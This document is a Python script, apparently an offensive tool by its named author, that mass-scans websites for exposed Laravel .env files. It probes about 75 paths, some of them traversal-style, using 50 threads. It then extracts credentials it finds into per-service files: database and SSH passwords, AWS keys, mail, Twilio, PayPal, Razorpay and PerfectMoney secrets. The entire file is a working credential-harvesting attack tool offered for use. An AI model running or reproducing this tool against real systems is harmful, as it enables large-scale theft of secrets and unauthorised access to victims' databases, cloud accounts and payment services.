import requests
import argparse
import concurrent.futures
import os
import re

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    END = '\033[0m'

green = Colors.GREEN
red = Colors.RED
yellow = Colors.YELLOW
cyan = Colors.CYAN
blue = Colors.BLUE
magenta = Colors.MAGENTA
end = Colors.END

# Banner
banner = '''
╔═══════════════════════════════════════════════════════════╗
║  Laravel .env File Finder & Data Extractor                ║
║  Author: Maw3six | t.me/maw3six                                       ║
╚═══════════════════════════════════════════════════════════╝
'''

class EnvFinder:
    def __init__(self, verbose=False):
        # Daftar lokasi potensial untuk file .env
        self.env_paths = [
            '/../../../.env',
            '/../../.env',
            '/../.env',
            '/.env',
            '/admin/.env',
            '/administrator/.env',
            '/api/.env',
            '/api2/.env',
            '/api3/.env',
            '/app/.env',
            '/apps/.env',
            '/asset/.env',
            '/assets/.env',
            '/clientes/.env',
            '/clientes/laravel/.env',
            '/clientes/laravel_inbox/.env',
            '/club/.env',
            '/config/.env',
            '/core/.env',
            '/core/Database/.env',
            '/core/app/.env',
            '/cron/.env',
            '/cronlab/.env',
            '/database/.env',
            '/en/.env',
            '/fileweb/.env',
            '/home/.env',
            '/l53/.env',
            '/lab/.env',
            '/laravel/.env',
            '/lib/.env',
            '/local/.env',
            '/main/.env',
            '/pemerintah/.env',
            '/public/.env',
            '/resources/.env',
            '/sistema/.env',
            '/site/.env',
            '/sitemaps/.env',
            '/system/.env',
            '/tools/.env',
            '/uploads/.env',
            '/v1/.env',
            '/vendor/.env',
            '/web/.env',
            '/webs/.env',
            '/website/.env',
            '/backend/.env',
            '/backup/.env',
            '/dev/.env',
            '/development/.env',
            '/html/.env',
            '/new/.env',
            '/old/.env',
            '/production/.env',
            '/staging/.env',
            '/storage/.env',
            '/test/.env',
            '/v2/.env',
            '/v3/.env',
            '/www/.env',
            '/.env.backup',
            '/.env.old',
            '/.env.save',
            '/.env.dev',
            '/.env.development',
            '/.env.local',
            '/.env.test',
            '/.env.staging',
            '/.env.prod',
            '/.env.production',
            '/.env.bak',
            '/.env.example',
            '/.env.sample',
            '/.env.txt',
            '/.env.copy'
        ]
        
        self.timeout = 10
        self.results_dir = 'results'
        self.all_env_file = f'{self.results_dir}/all_env.txt'
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        }
        self.verbose = verbose
        
        # Kategori data yang akan diekstrak
        self.categories = {
            'app_env': {
                'file': f'{self.results_dir}/app_env.txt',
                'patterns': [
                    r'APP_NAME=(.+)',
                    r'APP_ENV=(.+)',
                    r'APP_KEY=(.+)',
                    r'APP_DEBUG=(.+)',
                    r'APP_LOG_LEVEL=(.+)',
                    r'APP_URL=(.+)'
                ],
                'must_contain': 'APP_NAME'
            },
            'database': {
                'file': f'{self.results_dir}/database.txt',
                'patterns': [
                    r'DB_CONNECTION=(.+)',
                    r'DB_HOST=(.+)',
                    r'DB_PORT=(.+)',
                    r'DB_DATABASE=(.+)',
                    r'DB_USERNAME=(.+)',
                    r'DB_PASSWORD=(.+)'
                ],
                'must_contain': 'DB_HOST'
            },
            'mail': {
                'file': f'{self.results_dir}/mail.txt',
                'patterns': [
                    r'MAIL_DRIVER=(.+)',
                    r'MAIL_HOST=(.+)',
                    r'MAIL_PORT=(.+)',
                    r'MAIL_USERNAME=(.+)',
                    r'MAIL_PASSWORD=(.+)',
                    r'MAIL_ENCRYPTION=(.+)',
                    r'MAIL_FROM_ADDRESS=(.+)',
                    r'MAIL_FROM_NAME=(.+)'
                ],
                'must_contain': 'MAIL_HOST'
            },
            'aws': {
                'file': f'{self.results_dir}/aws.txt',
                'patterns': [
                    r'AWS_ACCESS_KEY=(.+)',
                    r'AWS_SECRET=(.+)',
                    r'AWS_ACCESS_KEY_ID=(.+)',
                    r'AWS_SECRET_ACCESS_KEY=(.+)',
                    r'AWS_S3_KEY=(.+)',
                    r'AWS_BUCKET=(.+)',
                    r'AWS_SES_KEY=(.+)',
                    r'AWS_SES_SECRET=(.+)',
                    r'SES_KEY=(.+)',
                    r'SES_SECRET=(.+)',
                    r'AWS_REGION=(.+)',
                    r'AWS_DEFAULT_REGION=(.+)',
                    r'SES_USERNAME=(.+)',
                    r'SES_PASSWORD=(.+)'
                ],
                'must_contain': 'AWS_ACCESS_KEY_ID'
            },
            'twilio': {
                'file': f'{self.results_dir}/twilio.txt',
                'patterns': [
                    r'TWILIO_ACCOUNT_SID=(.+)',
                    r'TWILIO_API_KEY=(.+)',
                    r'TWILIO_API_SECRET=(.+)',
                    r'TWILIO_CHAT_SERVICE_SID=(.+)',
                    r'TWILIO_AUTH_TOKEN=(.+)',
                    r'TWILIO_NUMBER=(.+)'
                ],
                'must_contain': 'TWILIO_ACCOUNT_SID'
            },
            'nexmo': {
                'file': f'{self.results_dir}/nexmo.txt',
                'patterns': [
                    r'NEXMO_KEY=(.+)',
                    r'NEXMO_SECRET=(.+)',
                    r'NEXMO_NUMBER=(.+)'
                ],
                'must_contain': 'NEXMO_KEY'
            },
            'ssh': {
                'file': f'{self.results_dir}/ssh.txt',
                'patterns': [
                    r'SSH_HOST=(.+)',
                    r'SSH_USERNAME=(.+)',
                    r'SSH_PASSWORD=(.+)'
                ],
                'must_contain': 'SSH_HOST'
            },
            'paypal': {
                'file': f'{self.results_dir}/paypal.txt',
                'patterns': [
                    r'PAYPAL_CLIENT_ID=(.+)',
                    r'PAYPAL_SECRET=(.+)',
                    r'PAYPAL_MODE=(.+)'
                ],
                'must_contain': 'PAYPAL_CLIENT_ID'
            },
            'razorpay': {
                'file': f'{self.results_dir}/razorpay.txt',
                'patterns': [
                    r'RAZORPAY_KEY=(.+)',
                    r'RAZORPAY_SECRET=(.+)'
                ],
                'must_contain': 'RAZORPAY_KEY'
            },
            'plivo': {
                'file': f'{self.results_dir}/plivo.txt',
                'patterns': [
                    r'PLIVO_AUTH_ID=(.+)',
                    r'PLIVO_AUTH_TOKEN=(.+)'
                ],
                'must_contain': 'PLIVO_AUTH_ID'
            },
            'blockchain': {
                'file': f'{self.results_dir}/blockchain.txt',
                'patterns': [
                    r'BLOCKCHAIN_API=(.+)',
                    r'DEFAULT_BTC_FEE=(.+)',
                    r'TRANSACTION_BTC_FEE=(.+)'
                ],
                'must_contain': 'BLOCKCHAIN_API'
            },
            'perfectmoney': {
                'file': f'{self.results_dir}/perfectmoney.txt',
                'patterns': [
                    r'PM_ACCOUNTID=(.+)',
                    r'PM_PASSPHRASE=(.+)',
                    r'PM_CURRENT_ACCOUNT=(.+)',
                    r'PM_MARCHANTID=(.+)',
                    r'PM_MARCHANT_NAME=(.+)',
                    r'PM_UNITS=(.+)',
                    r'PM_ALT_PASSPHRASE=(.+)'
                ],
                'must_contain': 'PM_ACCOUNTID'
            }
        }
        
        # Statistik
        self.stats = {
            'total': 0,
            'found': 0,
            'not_found': 0,
            'errors': 0
        }
        
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
        
        for category in self.categories:
            open(self.categories[category]['file'], 'w').close()
        
        open(self.all_env_file, 'w').close()
    
    def fix_url(self, url):
        if not url.startswith('http'):
            url = 'http://' + url
        
        if url.endswith('/'):
            url = url[:-1]
            
        return url

    def find_env_file(self, url):
        url = self.fix_url(url)
        found = False

        for path in self.env_paths:
            full_url = url + path
            try:
                response = requests.get(full_url, headers=self.headers, timeout=self.timeout)
                if response.status_code == 200 and 'APP_KEY=' in response.text:
                    found = True
                    self.stats['found'] += 1
                    self.save_env_data(full_url, response.text)
                    if self.verbose:
                        print(f"{green}[FOUND]{end} {full_url}")
                    break
            except requests.RequestException as e:
                self.stats['errors'] += 1
                if self.verbose:
                    print(f"{red}[ERROR]{end} {full_url} - {e}")

        if not found:
            self.stats['not_found'] += 1
            if self.verbose:
                print(f"{yellow}[NOT FOUND]{end} {url}")

    def save_env_data(self, url, data):
        """Menyimpan data .env yang ditemukan ke file"""
        with open(self.all_env_file, 'a') as f:
            f.write(f"URL: {url}\n{data}\n\n")

        for category, details in self.categories.items():
            if details['must_contain'] in data:
                with open(details['file'], 'a') as f:
                    f.write(f"URL: {url}\n")
                    for pattern in details['patterns']:
                        match = re.search(pattern, data)
                        if match:
                            f.write(f"{match.group(0)}\n")
                    f.write("\n")

    def run(self, urls):
        self.stats['total'] = len(urls)
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.find_env_file, urls)

        print(f"\n{cyan}Scan Complete!{end}")
        print(f"Total URLs: {self.stats['total']}")
        print(f"Found: {self.stats['found']}")
        print(f"Not Found: {self.stats['not_found']}")
        print(f"Errors: {self.stats['errors']}")

def main():
    parser = argparse.ArgumentParser(description='Laravel .env File Finder & Data Extractor')
    parser.add_argument('-u', '--url', type=str, help='Single URL to scan')
    parser.add_argument('-f', '--file', type=str, help='File containing list of URLs to scan')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()

    print(banner)
    finder = EnvFinder(verbose=args.verbose)

    if args.url:
        finder.run([args.url])
    elif args.file:
        with open(args.file, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
        finder.run(urls)
    else:
        print(f"{red}Please provide a URL or a file containing URLs.{end}")

if __name__ == '__main__':
    main()
